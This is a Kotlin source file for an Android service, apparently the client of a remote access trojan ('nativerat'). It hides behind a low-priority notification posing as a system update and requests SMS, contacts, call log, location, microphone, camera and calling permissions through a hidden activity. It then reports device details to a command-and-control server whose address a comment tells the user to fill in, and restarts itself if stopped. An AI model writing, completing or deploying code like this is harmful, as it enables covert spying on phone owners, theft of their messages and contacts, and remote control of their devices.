package com.nativerat.c2

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log

class MainService : Service() {

    companion object {
        private const val TAG = "C2Svc"

        // ⚠️ YAHAN APNA IP/PORT DAAL (DuckDNS hostname bhi chalega)
        const val C2_HOST = "127.0.0.1"
        const val C2_PORT = 4444

        private const val CHANNEL_ID = "c2_ch"
        private const val NOTIF_ID = 1
        private const val PREFS = "c2_prefs"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification())
        requestPermissionsOnce()
        Log.i(TAG, "starting native C2 -> $C2_HOST:$C2_PORT")
        Thread {
            try {
                val info = buildString {
                    append(Build.MANUFACTURER).append('|')
                    append(Build.MODEL).append('|')
                    append("SDK=").append(Build.VERSION.SDK_INT).append('|')
                    append("APP=").append(packageName)
                }
                val st = NativeBridge.runSelfTest()
                Log.i(TAG, "native self-test: $st")
                NativeBridge.startC2(C2_HOST, C2_PORT, info)
            } catch (t: Throwable) {
                Log.e(TAG, "native C2 error", t)
            }
        }.start()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        try { NativeBridge.stopC2() } catch (_: Throwable) {}
        super.onDestroy()
    }

    private fun createChannel() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
        ch.setShowBadge(false)
        nm.createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, HiddenActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentTitle("System")
            .setContentText("Updating system components")
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    // Ek baar runtime permissions try karta hai (grant.sh se bhi ho jata hai)
    private fun requestPermissionsOnce() {
        if (Build.VERSION.SDK_INT < 23) return
        val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
        if (prefs.getBoolean("asked", false)) return
        prefs.edit().putBoolean("asked", true).apply()

        val needed = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE
        ).filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }

        if (needed.isNotEmpty()) {
            startActivity(
                Intent(this, HiddenActivity::class.java)
                    .putExtra("perms", needed.toTypedArray())
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }
    }
}